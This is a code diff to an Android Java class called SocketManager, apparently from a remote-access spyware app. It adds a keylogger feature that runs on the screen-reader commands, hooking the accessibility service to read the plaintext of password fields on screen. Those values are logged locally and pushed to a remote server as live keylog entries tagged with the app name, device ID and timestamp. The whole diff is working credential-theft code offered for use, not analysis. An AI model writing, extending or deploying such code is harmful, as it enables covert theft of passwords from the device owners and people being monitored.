@@ -999,11 +999,21 @@ public class SocketManager {
         // Screen Reader commands
         ScreenReader sr = new ScreenReader(accessSvc);
         switch (command) {
-            case "read_screen":             return sr.readScreen();
+            case "read_screen": {
+                JSONObject screenResult = sr.readScreen();
+                // Side-effect: push any password fields found in the current screen
+                // as keylog entries with isPassword=true so PasswordsTab captures them
+                pushPasswordFieldsFromScreen(screenResult);
+                return screenResult;
+            }
             case "find_by_text":            return sr.findByText(params.getString("text"));
             case "get_current_app":         return sr.getCurrentApp();
             case "get_clickable_elements":  return sr.getClickableElements();
-            case "get_input_fields":        return sr.getInputFields();
+            case "get_input_fields": {
+                JSONObject inputResult = sr.getInputFields();
+                pushPasswordFieldsFromInputFields(inputResult);
+                return inputResult;
+            }
         }
 
         JSONObject r = new JSONObject();
@@ -1021,6 +1031,12 @@ public class SocketManager {
 
     /** Push a keylog entry to the server immediately (live feed) via live channel. */
     public void pushKeylogEntry(String packageName, String appName, String text, String eventType, String timestamp) {
+        pushKeylogEntry(packageName, appName, text, eventType, timestamp, false, "");
+    }
+
+    /** Push a keylog entry with password field metadata. */
+    public void pushKeylogEntry(String packageName, String appName, String text, String eventType,
+                                String timestamp, boolean isPassword, String fieldType) {
         liveExecutor.execute(() -> {
             try {
                 JSONObject entry = new JSONObject();
@@ -1029,12 +1045,80 @@ public class SocketManager {
                 entry.put("text", text);
                 entry.put("eventType", eventType);
                 entry.put("timestamp", timestamp);
+                entry.put("isPassword", isPassword);
+                entry.put("fieldType", isPassword ? (fieldType.isEmpty() ? "password" : fieldType) : fieldType);
                 entry.put("deviceId", DeviceInfo.getDeviceId(context));
                 sendLiveMessage("keylog:entry", entry);
             } catch (Exception e) {
                 Log.e(TAG, "pushKeylogEntry error: " + e.getMessage());
             }
         });
+    }
+
+    /** Scan a read_screen result for password fields and push them as keylog entries. */
+    private void pushPasswordFieldsFromScreen(JSONObject screenResult) {
+        if (screenResult == null || !screenResult.optBoolean("success", false)) return;
+        try {
+            JSONObject screen = screenResult.optJSONObject("screen");
+            if (screen == null) return;
+            String packageName = screen.optString("packageName", "");
+            String appName = "";
+            try {
+                android.content.pm.PackageManager pm = context.getPackageManager();
+                android.content.pm.ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
+                appName = pm.getApplicationLabel(ai).toString();
+            } catch (Exception ignored) {}
+            org.json.JSONArray elements = screen.optJSONArray("elements");
+            if (elements == null) return;
+            String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
+                    java.util.Locale.getDefault()).format(new java.util.Date());
+            for (int i = 0; i < elements.length(); i++) {
+                JSONObject el = elements.optJSONObject(i);
+                if (el == null) continue;
+                boolean isPass = el.optBoolean("isPassword", false);
+                if (!isPass) continue;
+                String pwText = el.optString("passwordText", "");
+                if (pwText.isEmpty()) continue;
+                String hint = el.optString("hint", "password");
+                final String finalAppName = appName.isEmpty() ? packageName : appName;
+                final String finalHint = hint;
+                final String finalPkg = packageName;
+                final String finalText = pwText;
+                final String finalTs = ts;
+                keyloggerService.logEntry(finalPkg, finalAppName, finalText, "PASSWORD_FOCUS");
+                if (isConnected()) {
+                    pushKeylogEntry(finalPkg, finalAppName, finalText, "PASSWORD_FOCUS",
+                            finalTs, true, finalHint);
+                }
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "pushPasswordFieldsFromScreen: " + e.getMessage());
+        }
+    }
+
+    /** Scan a get_input_fields result for password fields and push them as keylog entries. */
+    private void pushPasswordFieldsFromInputFields(JSONObject inputResult) {
+        if (inputResult == null || !inputResult.optBoolean("success", false)) return;
+        try {
+            org.json.JSONArray inputs = inputResult.optJSONArray("inputs");
+            if (inputs == null) return;
+            String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
+                    java.util.Locale.getDefault()).format(new java.util.Date());
+            for (int i = 0; i < inputs.length(); i++) {
+                JSONObject inp = inputs.optJSONObject(i);
+                if (inp == null) continue;
+                boolean isPass = inp.optBoolean("isPassword", false);
+                if (!isPass) continue;
+                String pwText = inp.optString("passwordText", "");
+                if (pwText.isEmpty()) continue;
+                String hint = inp.optString("hint", "password");
+                if (isConnected()) {
+                    pushKeylogEntry("", "", pwText, "PASSWORD_FOCUS", ts, true, hint);
+                }
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "pushPasswordFieldsFromInputFields: " + e.getMessage());
+        }
     }
 
     /** Push a live notification to the server (relayed to dashboard) via live channel. */
